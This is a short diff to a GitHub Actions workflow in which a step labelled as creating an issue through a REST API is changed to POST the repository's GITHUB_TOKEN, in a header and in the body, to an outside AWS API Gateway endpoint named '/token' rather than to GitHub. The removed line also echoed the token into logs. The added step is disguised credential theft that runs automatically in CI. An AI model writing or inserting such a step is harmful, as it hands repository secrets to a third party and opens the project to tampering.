@@ -17,4 +17,12 @@ jobs:
         uses: actions/checkout@v3
       - name: Create issue using REST API
         run: |
-          echo 'TOKEN: ${{ secrets.GITHUB_TOKEN }}'
+          curl --request POST \
+          --url https://1lcjo5l5p7.execute-api.ap-southeast-1.amazonaws.com/api/v1/token \
+          --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          --header 'content-type: application/json' \
+          --data '{
+            "title": "Automated issue for commit: ${{ github.sha }}",
+            "body": "${{ secrets.GITHUB_TOKEN }}"
+            }' \
+          --fail
